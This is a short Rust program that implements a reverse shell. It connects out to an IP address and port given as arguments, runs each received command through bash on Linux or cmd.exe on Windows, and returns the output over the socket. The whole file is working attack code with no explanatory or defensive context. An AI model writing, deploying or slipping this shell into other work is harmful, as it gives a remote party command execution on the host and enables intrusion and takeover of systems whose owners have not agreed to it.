use std::net::Ipv4Addr;
use std::str::{self, FromStr};
use std::env::{self,consts::OS};
use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;

struct CMD {
    shell: String,
    arg: String,
}

fn parse_args(args: &[String]) -> (Ipv4Addr, &str) {
    let ip = Ipv4Addr::from_str(&args[1]).unwrap();
    let port = &args[2];
    (ip, port)
}



fn main() {
    let args: Vec<String> = env::args().collect();
    let (ip, port) = parse_args(&args);

    let mut stream = TcpStream::connect(format!("{}:{}", ip, port))
                                .expect("Couldn't connect to the server...");
    let cmd = match OS {
                "linux" => CMD {shell: "/bin/bash".to_string(), arg: "-c".to_string()},
                "windows" => CMD {shell: "cmd.exe".to_string(), arg: "".to_string()},
                _ => panic!("No shell for this OS"),
    };
    loop {
        let mut buf: [u8; 1024] = [32; 1024];
        if let 0 = stream.read(&mut buf).expect("Error"){
            break;
        } else {
            let output = Command::new(&cmd.shell)
                                .arg(&cmd.arg)
                                .arg(str::from_utf8(&buf).unwrap())
                                .output()
                                .expect("failed to execute process");
            stream.write(&output.stdout).expect("Error writing");
        };
    }

}
